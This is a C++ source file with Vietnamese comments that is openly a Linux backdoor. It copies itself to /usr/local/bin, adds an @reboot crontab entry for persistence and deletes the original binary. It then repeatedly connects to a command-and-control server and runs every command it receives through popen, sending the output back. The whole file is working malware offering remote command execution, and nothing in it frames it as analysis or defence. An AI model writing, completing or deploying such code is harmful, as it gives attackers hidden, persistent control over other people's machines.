#include <iostream>
#include <fstream>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <csignal>
#include <sys/types.h>
#include <sys/stat.h>

#define C2_IP "127.0.0.1"  // Địa chỉ máy chủ C&C (thay đổi nếu cần)
#define C2_PORT 4444       // Cổng lắng nghe trên máy chủ C&C
#define RETRY_DELAY 30     // Thời gian đợi giữa các lần thử kết nối (giây)

// Đường dẫn tệp backdoor
#define INSTALL_PATH "/usr/local/bin/mybackdoor"

// Tạo backdoor tự cài đặt
void install_self() {
    char current_path[1024];
    if (readlink("/proc/self/exe", current_path, sizeof(current_path)) != -1) {
        if (strcmp(current_path, INSTALL_PATH) != 0) {
            // Sao chép chương trình tới vị trí cài đặt
            std::ifstream src(current_path, std::ios::binary);
            std::ofstream dst(INSTALL_PATH, std::ios::binary);
            dst << src.rdbuf();
            src.close();
            dst.close();

            // Đặt quyền thực thi cho tệp
            chmod(INSTALL_PATH, 0755);

            // Thêm vào crontab để khởi động cùng hệ thống
            system("echo '@reboot /usr/local/bin/mybackdoor' | crontab -");

            // Xóa tệp gốc
            unlink(current_path);

            // Chạy lại từ vị trí cài đặt
            execl(INSTALL_PATH, INSTALL_PATH, NULL);
        }
    }
}

// Hàm thực thi lệnh
std::string execute_command(const std::string &command) {
    char buffer[128];
    std::string result;
    FILE *pipe = popen(command.c_str(), "r");
    if (!pipe) return "Error executing command\n";

    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        result += buffer;
    }
    pclose(pipe);
    return result;
}

// Kết nối tới C&C server
void connect_to_cc() {
    int sock;
    struct sockaddr_in server;

    while (true) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1) {
            std::cerr << "Error creating socket\n";
            sleep(RETRY_DELAY);
            continue;
        }

        server.sin_family = AF_INET;
        server.sin_port = htons(C2_PORT);
        inet_pton(AF_INET, C2_IP, &server.sin_addr);

        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0) {
            std::cout << "Connected to C&C server\n";

            char buffer[1024];
            while (true) {
                memset(buffer, 0, sizeof(buffer));
                int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
                if (bytes_received <= 0) break;

                std::string command(buffer);
                std::string output = execute_command(command);
                send(sock, output.c_str(), output.size(), 0);
            }
            close(sock);
        } else {
            std::cerr << "Connection failed. Retrying in " << RETRY_DELAY << " seconds...\n";
            close(sock);
            sleep(RETRY_DELAY);
        }
    }
}

int main() {
    // Chạy như daemon
    //if (fork() != 0) exit(0);
    //setsid();
    //umask(0);

    // Cài đặt chương trình
    install_self();

    // Kết nối tới C&C server
    connect_to_cc();

    return 0;
}

